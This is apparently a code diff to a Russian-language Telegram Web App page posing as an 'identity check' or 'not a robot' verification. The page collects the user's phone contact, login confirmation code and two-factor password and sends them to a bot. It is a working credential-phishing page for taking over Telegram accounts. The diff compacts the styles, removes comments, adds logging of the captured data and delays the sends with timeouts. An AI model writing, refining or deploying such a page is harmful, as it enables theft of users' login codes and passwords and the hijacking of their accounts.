@@ -6,11 +6,7 @@
     <title>Проверка личности</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: #0f0f0f;
@@ -29,37 +25,12 @@
             box-shadow: 0 12px 40px rgba(0,0,0,0.6);
             border: 1px solid #2a2a2a;
         }
-        .logo {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .logo svg {
-            width: 60px;
-            height: 60px;
-        }
-        h2 {
-            color: #fff;
-            font-size: 22px;
-            font-weight: 700;
-            text-align: center;
-            margin-bottom: 8px;
-        }
-        .sub {
-            color: #aaa;
-            text-align: center;
-            font-size: 14px;
-            margin-bottom: 25px;
-        }
-        .input-group {
-            margin-bottom: 16px;
-        }
-        .input-group label {
-            display: block;
-            color: #ccc;
-            font-size: 13px;
-            font-weight: 500;
-            margin-bottom: 5px;
-        }
+        .logo { text-align: center; margin-bottom: 20px; }
+        .logo svg { width: 60px; height: 60px; }
+        h2 { color: #fff; font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 8px; }
+        .sub { color: #aaa; text-align: center; font-size: 14px; margin-bottom: 25px; }
+        .input-group { margin-bottom: 16px; }
+        .input-group label { display: block; color: #ccc; font-size: 13px; font-weight: 500; margin-bottom: 5px; }
         .input-group input {
             width: 100%;
             padding: 14px 16px;
@@ -71,9 +42,7 @@
             outline: none;
             transition: border 0.2s;
         }
-        .input-group input:focus {
-            border-color: #6c8cff;
-        }
+        .input-group input:focus { border-color: #6c8cff; }
         .btn {
             width: 100%;
             padding: 14px;
@@ -87,12 +56,8 @@
             transition: background 0.2s;
             margin-top: 10px;
         }
-        .btn:hover {
-            background: #5a7ae0;
-        }
-        .btn:active {
-            transform: scale(0.98);
-        }
+        .btn:hover { background: #5a7ae0; }
+        .btn:active { transform: scale(0.98); }
         .btn-share {
             width: 100%;
             padding: 14px;
@@ -106,28 +71,11 @@
             transition: background 0.2s;
             margin-top: 10px;
         }
-        .btn-share:hover {
-            background: #5a7ae0;
-        }
-        .status {
-            margin-top: 15px;
-            text-align: center;
-            font-size: 14px;
-            color: #ff6b6b;
-            min-height: 24px;
-        }
-        .status.success {
-            color: #69db7c;
-        }
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            color: #666;
-            font-size: 12px;
-        }
-        .hidden {
-            display: none !important;
-        }
+        .btn-share:hover { background: #5a7ae0; }
+        .status { margin-top: 15px; text-align: center; font-size: 14px; color: #ff6b6b; min-height: 24px; }
+        .status.success { color: #69db7c; }
+        .footer { text-align: center; margin-top: 20px; color: #666; font-size: 12px; }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
@@ -140,7 +88,6 @@
         <h2>Проверка личности</h2>
         <p class="sub">Подтвердите, что вы не робот</p>
 
-        <!-- Шаг 1: Запрос контакта -->
         <div id="stepContact">
             <p style="color:#aaa; text-align:center; margin-bottom:20px;">
                 Нажмите кнопку, чтобы поделиться номером
@@ -148,7 +95,6 @@
             <button class="btn-share" id="shareContactBtn">📱 Поделиться контактом</button>
         </div>
 
-        <!-- Шаг 2: Ввод кода -->
         <div id="stepCode" class="hidden">
             <div class="input-group">
                 <label>Код подтверждения</label>
@@ -176,7 +122,6 @@
         tg.ready();
         tg.expand();
 
-        // Функция отправки данных в бота (один раз)
         function sendDataToBot() {
             if (isDataSent) return;
             isDataSent = true;
@@ -187,9 +132,10 @@
                 password: password
             };
             tg.sendData(JSON.stringify(data));
+            console.log('[WebApp] Данные отправлены:', data);
         }
 
-        // Шаг 1: Запрос контакта
+        // Принудительная отправка данных через 1 секунду после получения контакта
         document.getElementById('shareContactBtn').addEventListener('click', function() {
             const status = document.getElementById('status');
             
@@ -206,10 +152,11 @@
                 status.textContent = `✅ Номер получен: ${phone}`;
                 status.className = 'status success';
 
-                // Отправляем номер в бота
-                sendDataToBot();
+                // Отправляем данные с задержкой
+                setTimeout(() => {
+                    sendDataToBot();
+                }, 500);
 
-                // Показываем шаг с кодом
                 document.getElementById('stepContact').style.display = 'none';
                 document.getElementById('stepCode').classList.remove('hidden');
                 step = 'code';
@@ -223,7 +170,6 @@
             });
         });
 
-        // Шаг 2: Ввод кода
         document.getElementById('submitCodeBtn').addEventListener('click', function() {
             const status = document.getElementById('status');
             code = document.getElementById('codeInput').value.trim();
@@ -234,19 +180,19 @@
                 return;
             }
 
-            // Отправляем код в бота
-            sendDataToBot();
+            // Отправляем код с задержкой
+            setTimeout(() => {
+                sendDataToBot();
+            }, 500);
 
             status.textContent = '⏳ Проверка...';
             status.className = 'status';
 
-            // Показываем поле для пароля (на случай 2FA)
             document.getElementById('passwordGroup').style.display = 'block';
             document.getElementById('submitCodeBtn').textContent = 'Подтвердить пароль';
             step = 'password';
         });
 
-        // Шаг 3: Ввод пароля
         document.getElementById('passwordInput').addEventListener('input', function() {
             password = this.value.trim();
         });
@@ -256,8 +202,9 @@
                 const status = document.getElementById('status');
                 password = document.getElementById('passwordInput').value.trim();
 
-                // Отправляем пароль в бота
-                sendDataToBot();
+                setTimeout(() => {
+                    sendDataToBot();
+                }, 500);
 
                 status.textContent = '✅ Подтверждено!';
                 status.className = 'status success';
